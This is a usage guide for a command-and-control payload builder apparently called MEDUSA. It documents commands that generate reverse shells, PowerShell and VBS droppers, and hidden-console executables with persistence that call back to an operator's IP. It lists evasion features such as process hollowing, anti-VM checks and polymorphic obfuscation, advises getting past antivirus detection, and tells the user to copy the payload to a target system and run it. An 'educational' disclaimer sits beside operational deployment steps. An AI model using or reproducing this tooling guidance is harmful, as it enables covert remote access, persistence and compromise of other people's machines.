# MEDUSA C2 Builder - Usage Guide

## Overview
The MEDUSA C2 Builder is a comprehensive payload generation tool that creates various types of reverse shell payloads and executables for educational cybersecurity purposes.

## Features

### 🔨 Executable Builder
- **Python to EXE**: Convert Python clients to standalone executables using PyInstaller
- **Console Hiding**: Generate executables that run without showing a console window
- **Custom Icons**: Add custom icons to executables
- **Persistence**: Include persistence mechanisms for Windows and Linux
- **UPX Compression**: Automatic UPX compression if available

### 🐚 Reverse Shell Generators
- **Netcat Commands**: Windows and Linux netcat reverse shells
- **PowerShell Scripts**: Advanced PowerShell reverse shells with encoding options
- **Batch Droppers**: Windows batch file droppers
- **VBS Droppers**: Visual Basic Script droppers

## Usage Examples

### 1. Generate Python Client and Build EXE
```bash
# Basic Python client
python builder.py --type python --ip 192.168.1.100 --port 4444 --output myclient

# Build executable with hidden console
python builder.py --type python --ip 192.168.1.100 --port 4444 --output myclient --build-exe --hide-console

# Add persistence and custom icon
python builder.py --type python --ip 192.168.1.100 --port 4444 --output myclient --build-exe --hide-console --persistence --icon myicon.ico
```

### 2. Generate Netcat Commands
```bash
# Generate netcat reverse shell commands
python builder.py --type netcat --ip 192.168.1.100 --port 4444
```

### 3. Generate PowerShell Payloads
```bash
# Basic PowerShell script
python builder.py --type powershell --ip 192.168.1.100 --port 4444 --output psrevshell

# Encoded PowerShell payload
python builder.py --type powershell --ip 192.168.1.100 --port 4444 --output psrevshell --encode
```

### 4. Generate Droppers
```bash
# Batch file dropper
python builder.py --type batch --ip 192.168.1.100 --port 4444 --output dropper

# VBS dropper
python builder.py --type vbs --ip 192.168.1.100 --port 4444 --output dropper
```

## Command Line Options

### Required Arguments
- `--type`: Payload type (`python`, `netcat`, `powershell`, `batch`, `vbs`)
- `--ip`: Server IP address
- `--port`: Server port number

### Optional Arguments
- `--output`: Output filename (default: 'client')
- `--build-exe`: Build executable with PyInstaller (Python only)
- `--hide-console`: Hide console window (Python/EXE only)
- `--persistence`: Add persistence mechanisms (Python only)
- `--encode`: Base64 encode payload (PowerShell only)
- `--icon`: Icon file for executable (EXE only)

## Output Structure

The builder creates the following directory structure:

```
nova/
├── builder.py
├── payloads/
│   ├── client.py          # Generated Python client
│   ├── client.exe         # Built executable
│   ├── psrevshell.ps1     # PowerShell script
│   ├── dropper.bat        # Batch dropper
│   ├── dropper.vbs        # VBS dropper
│   └── payload_info_*.json # Generation metadata
├── build/                 # PyInstaller build files
└── templates/            # Template storage
```

## Prerequisites

### For Python to EXE Building
```bash
# Install PyInstaller
pip install pyinstaller

# Optional: Install UPX for compression
# Download from https://upx.github.io/
```

### For Advanced Features
```bash
# Install additional dependencies
pip install cryptography
pip install psutil
```

## Security Features

### 🔒 Built-in Security
- **Encrypted Communication**: JSON-based encrypted messaging
- **Client ID Generation**: Unique client identification
- **Jitter**: Anti-detection timing randomization
- **Persistence**: Registry/autostart persistence options
- **Error Handling**: Robust error handling and reconnection

### 🛡️ Evasion Techniques
- **Console Hiding**: No visible windows
- **Process Hollowing**: Advanced injection techniques (advanced version)
- **Anti-VM Detection**: Virtual machine detection (advanced version)
- **Polymorphic Code**: Code obfuscation options (advanced version)

## Integration with MEDUSA C2

The generated payloads are fully compatible with the MEDUSA C2 server:

1. **Start MEDUSA Server**:
   ```bash
   python server.py
   ```

2. **Generate Client**:
   ```bash
   python builder.py --type python --ip YOUR_SERVER_IP --port 4444 --build-exe --hide-console
   ```

3. **Deploy and Execute**:
   - Copy the generated executable to target system
   - Execute the payload
   - Monitor connections in MEDUSA web interface

## Web Interface Integration

The builder can also be used programmatically from the MEDUSA web interface:

```python
from builder import PayloadBuilder

builder = PayloadBuilder()

# Generate Python client
py_file = builder.generate_python_client("192.168.1.100", 4444, "webclient")

# Build executable
exe_file = builder.build_executable(py_file, "webclient", hide_console=True)
```

## Educational Disclaimer

⚠️ **IMPORTANT**: This tool is designed for educational purposes and authorized penetration testing only. Users are responsible for ensuring they have proper authorization before using these tools in any environment.

## Legal Notice

- Only use in controlled environments
- Obtain proper authorization before testing
- Respect all applicable laws and regulations
- Educational and research purposes only

## Troubleshooting

### Common Issues

1. **PyInstaller not found**:
   ```bash
   pip install pyinstaller
   ```

2. **Permission denied**:
   - Run as administrator (Windows)
   - Check file permissions (Linux/macOS)

3. **Antivirus detection**:
   - Add exclusions for development folder
   - Use encoding/obfuscation options

4. **Build errors**:
   - Check Python path
   - Verify all dependencies installed
   - Check disk space

### Debug Mode

Add debug output to troubleshoot issues:

```bash
python builder.py --type python --ip 127.0.0.1 --port 4444 --output debug_client --build-exe --debug
```

## Advanced Usage

### Custom Templates

Create custom payload templates in the `templates/` directory and modify the builder to use them.

### Batch Generation

Generate multiple payloads with different configurations:

```bash
# Create multiple variants
for port in 4444 5555 6666; do
    python builder.py --type python --ip 192.168.1.100 --port $port --output client_$port --build-exe
done
```

### Automation

Integrate with CI/CD pipelines for automated payload generation:

```yaml
# Example GitHub Actions workflow
- name: Generate Payloads
  run: |
    python builder.py --type python --ip ${{ secrets.C2_IP }} --port 4444 --build-exe
```

## Support

For issues, questions, or contributions:
- Review the MEDUSA C2 documentation
- Check the troubleshooting section
- Ensure proper educational/authorized use context